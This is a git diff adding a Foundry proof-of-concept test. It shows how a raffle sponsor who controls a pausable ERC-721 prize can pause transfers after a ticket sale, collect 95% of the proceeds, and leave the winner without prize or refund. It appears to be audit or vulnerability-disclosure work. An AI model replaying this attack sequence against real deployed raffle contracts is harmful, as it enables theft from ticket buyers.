@@ -1,0 +1,294 @@
+diff --git a/packages/contracts/test/foundry/PausablePrizeSponsorPayoutPoC.t.sol b/packages/contracts/test/foundry/PausablePrizeSponsorPayoutPoC.t.sol
+new file mode 100644
+index 0000000..21e5ba0
+--- /dev/null
++++ b/packages/contracts/test/foundry/PausablePrizeSponsorPayoutPoC.t.sol
+@@ -0,0 +1,288 @@
++// SPDX-License-Identifier: MIT
++pragma solidity 0.8.36;
++
++import { IVRFV2PlusWrapper } from
++    "@chainlink/contracts/src/v0.8/vrf/dev/interfaces/IVRFV2PlusWrapper.sol";
++import { ERC721 } from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
++import { IERC721 } from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
++
++import { RaffleFactory } from "../../src/RaffleFactory.sol";
++import { IRaffle } from "../../src/interfaces/IRaffle.sol";
++import { IRaffleFactory } from "../../src/interfaces/IRaffleFactory.sol";
++
++interface Vm {
++    function prank(address msgSender) external;
++    function warp(uint256 newTimestamp) external;
++}
++
++interface IRawVrfConsumer {
++    function rawFulfillRandomWords(uint256 requestId, uint256[] memory randomWords) external;
++}
++
++/// @dev Six-decimal payment token used only to exercise the production raffle accounting and transfers.
++contract PoCQuoteToken {
++    string public constant name = "PoC USD Coin";
++    string public constant symbol = "pUSDC";
++    uint8 public constant decimals = 6;
++
++    mapping(address account => uint256 amount) public balanceOf;
++    mapping(address owner => mapping(address spender => uint256 amount)) public allowance;
++
++    function mint(address recipient, uint256 amount) external {
++        balanceOf[recipient] += amount;
++    }
++
++    function approve(address spender, uint256 amount) external returns (bool) {
++        allowance[msg.sender][spender] = amount;
++        return true;
++    }
++
++    function transfer(address recipient, uint256 amount) external returns (bool) {
++        _transfer(msg.sender, recipient, amount);
++        return true;
++    }
++
++    function transferFrom(address owner, address recipient, uint256 amount) external returns (bool) {
++        uint256 approved = allowance[owner][msg.sender];
++        require(approved >= amount, "allowance");
++        if (approved != type(uint256).max) allowance[owner][msg.sender] = approved - amount;
++        _transfer(owner, recipient, amount);
++        return true;
++    }
++
++    function _transfer(address owner, address recipient, uint256 amount) private {
++        require(balanceOf[owner] >= amount, "balance");
++        balanceOf[owner] -= amount;
++        balanceOf[recipient] += amount;
++    }
++}
++
++/// @dev A standards-reporting ERC-721 whose sponsor retains a normal transfer-pause authority.
++contract SponsorPausablePrize is ERC721 {
++    error OnlyPauseAdmin();
++    error TransfersPaused();
++
++    address public immutable pauseAdmin;
++    bool public transfersPaused;
++
++    constructor(address pauseAdmin_) ERC721("Sponsor Pausable Prize", "SPP") {
++        pauseAdmin = pauseAdmin_;
++        _mint(pauseAdmin_, 1);
++    }
++
++    function pauseTransfers() external {
++        if (msg.sender != pauseAdmin) revert OnlyPauseAdmin();
++        transfersPaused = true;
++    }
++
++    function unpauseTransfers() external {
++        if (msg.sender != pauseAdmin) revert OnlyPauseAdmin();
++        transfersPaused = false;
++    }
++
++    function _update(address to, uint256 tokenId, address auth) internal override returns (address previousOwner) {
++        if (transfersPaused) revert TransfersPaused();
++        previousOwner = super._update(to, tokenId, auth);
++    }
++}
++
++/// @dev Minimal local stand-in for the trusted wrapper. It preserves the production request/callback boundary:
++///      only this wrapper contract calls rawFulfillRandomWords on the real Raffle clone.
++contract PoCVrfWrapper is IVRFV2PlusWrapper {
++    uint256 public override lastRequestId;
++    mapping(uint256 requestId => address consumer) public consumerByRequest;
++
++    function calculateRequestPrice(uint32, uint32) external pure override returns (uint256) {
++        return 0;
++    }
++
++    function calculateRequestPriceNative(uint32, uint32) external pure override returns (uint256) {
++        return 0;
++    }
++
++    function estimateRequestPrice(uint32, uint32, uint256) external pure override returns (uint256) {
++        return 0;
++    }
++
++    function estimateRequestPriceNative(uint32, uint32, uint256) external pure override returns (uint256) {
++        return 0;
++    }
++
++    function requestRandomWordsInNative(uint32, uint16, uint32, bytes calldata)
++        external
++        payable
++        override
++        returns (uint256 requestId)
++    {
++        requestId = ++lastRequestId;
++        consumerByRequest[requestId] = msg.sender;
++    }
++
++    function fulfill(uint256 requestId, uint256 randomWord) external {
++        uint256[] memory words = new uint256[](1);
++        words[0] = randomWord;
++        IRawVrfConsumer(consumerByRequest[requestId]).rawFulfillRandomWords(requestId, words);
++    }
++
++    function link() external pure override returns (address) {
++        return address(0x1111);
++    }
++
++    function linkNativeFeed() external pure override returns (address) {
++        return address(0x2222);
++    }
++}
++
++/**
++ * @notice Executable PoC for sponsor payout before delivery of a pausable prize.
++ *
++ * Reproduction (from the repository snapshot):
++ *   cd packages/contracts
++ *   forge test --match-contract PausablePrizeSponsorPayoutPoC -vvvv
++ * Expected: the single test passes after asserting the 950,000-unit sponsor payout and both
++ * winner redemption and refund failures.
++ *
++ * Attacker model: the attacker is a raffle sponsor and the pause administrator of an otherwise
++ * standards-compliant ERC-721 selected as the prize. The attacker controls the prize address,
++ * prize ID, reserve (set to one), sponsor recipient, and when transfers are paused. The victim is
++ * an ordinary outside buyer. The VRF result is irrelevant because the sole sold entry always wins.
++ */
++contract PausablePrizeSponsorPayoutPoC {
++    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
++
++    address private constant ATTACKER_SPONSOR = address(0xA11CE);
++    address private constant VICTIM = address(0xB0B);
++    address private constant TREASURY = address(0xFEE);
++
++    PoCQuoteToken private quote;
++    PoCVrfWrapper private wrapper;
++    RaffleFactory private factory;
++    SponsorPausablePrize private prize;
++    IRaffle private raffle;
++    address private raffleAddress;
++    uint64 private endTime;
++
++    function test_SponsorTakesNinetyFivePercentWhileWinnerGetsNeitherPrizeNorRefund() external {
++        _deployAndEscrowPrize();
++        uint256 ticketId = _sellSoleTicket();
++        _pauseResolveAndTakeSponsorPayout(ticketId);
++        _proveWinnerCannotRedeem(ticketId);
++        _proveWinnerCannotRefund(ticketId);
++
++        // Demonstrated impact: the sponsor permanently controls delivery after receiving 95% of
++        // the sale, while the victim currently holds neither its payment nor the promised NFT and
++        // the raffle has recorded no refundable liability.
++        require(quote.balanceOf(VICTIM) == 0, "victim recovered payment");
++        require(raffle.remainingRefundLiability() == 0, "refund liability exists");
++        require(quote.balanceOf(raffleAddress) == 50_000, "only protocol fee should remain");
++    }
++
++    function _deployAndEscrowPrize() private {
++        quote = new PoCQuoteToken();
++        wrapper = new PoCVrfWrapper();
++        factory = new RaffleFactory(address(quote), address(wrapper), TREASURY);
++        prize = new SponsorPausablePrize(ATTACKER_SPONSOR);
++
++        // The attacker-selected token truthfully reports ERC-721 support. Escrow and all factory
++        // post-transfer checks succeed because the sponsor has not paused transfers yet.
++        vm.prank(ATTACKER_SPONSOR);
++        prize.approve(address(factory), 1);
++
++        endTime = uint64(block.timestamp + 1 days);
++        vm.prank(ATTACKER_SPONSOR);
++        raffleAddress = factory.createRaffle(
++            IRaffleFactory.CreateRaffleParams({
++                sponsorRecipient: ATTACKER_SPONSOR,
++                prizeToken: address(prize),
++                prizeTokenId: 1,
++                reserveEntries: 1,
++                endTime: endTime
++            })
++        );
++        raffle = IRaffle(raffleAddress);
++
++        require(prize.ownerOf(1) == raffleAddress, "prize was not genuinely escrowed");
++        require(raffle.status() == IRaffle.Status.Active, "raffle did not activate");
++    }
++
++    function _sellSoleTicket() private returns (uint256 ticketId) {
++        // An outside victim pays exactly one USDC for the only ticket.
++        quote.mint(VICTIM, raffle.ENTRY_PRICE());
++        vm.prank(VICTIM);
++        quote.approve(raffleAddress, type(uint256).max);
++        vm.prank(VICTIM);
++        ticketId = raffle.buyEntries(VICTIM, 1);
++        require(ticketId == 1, "unexpected ticket");
++        require(quote.balanceOf(VICTIM) == 0, "victim did not pay");
++    }
++
++    function _pauseResolveAndTakeSponsorPayout(uint256 ticketId) private {
++        // Only after taking the victim's payment does the sponsor exercise its retained role.
++        vm.prank(ATTACKER_SPONSOR);
++        prize.pauseTransfers();
++
++        // Drive the real Raffle through its request and authenticated wrapper callback. With one
++        // entry and reserveEntries == 1, every random word resolves to NftWon.
++        vm.warp(endTime);
++        uint256 requestId = raffle.requestDraw();
++        wrapper.fulfill(requestId, 123456);
++        require(raffle.status() == IRaffle.Status.NftWon, "raffle did not resolve NftWon");
++        require(raffle.winningEntry() == 1, "sole entry did not win");
++
++        // Settlement performs no prize transfer, yet it immediately makes 95% claimable by the
++        // sponsor. releaseSponsorProceeds has no prizeClaimed/winnerRedeemed prerequisite.
++        vm.prank(ATTACKER_SPONSOR);
++        raffle.settleWinningTicket(ticketId);
++        require(raffle.sponsorProceeds() == 950_000, "wrong sponsor allocation");
++        require(!raffle.winnerRedeemed(), "winner unexpectedly redeemed before payout");
++
++        vm.prank(ATTACKER_SPONSOR);
++        uint256 stolenProceeds = raffle.releaseSponsorProceeds();
++        require(stolenProceeds == 950_000, "wrong released amount");
++        require(quote.balanceOf(ATTACKER_SPONSOR) == 950_000, "sponsor was not paid");
++        require(raffle.sponsorProceeds() == 0, "sponsor claim was not consumed");
++    }
++
++    function _proveWinnerCannotRedeem(uint256 ticketId) private {
++        // The winner's real redemption reaches prize.transferFrom and reverts on the sponsor's
++        // pause. Atomic rollback leaves both the NFT and winning ticket in place.
++        vm.prank(VICTIM);
++        (bool redeemed, bytes memory redeemRevert) = raffleAddress.call(
++            abi.encodeWithSelector(IRaffle.redeemWinningTicket.selector, ticketId)
++        );
++        require(!redeemed, "paused prize was delivered");
++        require(_selector(redeemRevert) == SponsorPausablePrize.TransfersPaused.selector, "unexpected redeem revert");
++        require(prize.ownerOf(1) == raffleAddress, "prize left escrow");
++        require(IERC721(raffleAddress).ownerOf(ticketId) == VICTIM, "failed redemption burned ticket");
++        require(!raffle.winnerRedeemed(), "failed redemption changed winnerRedeemed");
++        require(!raffle.prizeClaimed(), "failed redemption changed prizeClaimed");
++    }
++
++    function _proveWinnerCannotRefund(uint256 ticketId) private {
++        // NftWon is terminal: even long after every liveness deadline, enableRefunds rejects it,
++        // and refundTickets is likewise inaccessible.
++        vm.warp(block.timestamp + 365 days);
++        vm.prank(VICTIM);
++        (bool refundsEnabled, bytes memory enableRevert) = raffleAddress.call(
++            abi.encodeWithSelector(IRaffle.enableRefunds.selector)
++        );
++        require(!refundsEnabled, "refunds unexpectedly enabled");
++        require(_selector(enableRevert) == IRaffle.InvalidStatus.selector, "unexpected enableRefunds revert");
++
++        uint256[] memory ticketIds = new uint256[](1);
++        ticketIds[0] = ticketId;
++        vm.prank(VICTIM);
++        (bool refunded, bytes memory refundRevert) = raffleAddress.call(
++            abi.encodeWithSelector(IRaffle.refundTickets.selector, ticketIds)
++        );
++        require(!refunded, "victim unexpectedly refunded");
++        require(_selector(refundRevert) == IRaffle.InvalidStatus.selector, "unexpected refund revert");
++    }
++
++    function _selector(bytes memory revertData) private pure returns (bytes4 selector) {
++        if (revertData.length < 4) return bytes4(0);
++        assembly ("memory-safe") {
++            selector := mload(add(revertData, 0x20))
++        }
++    }
++}
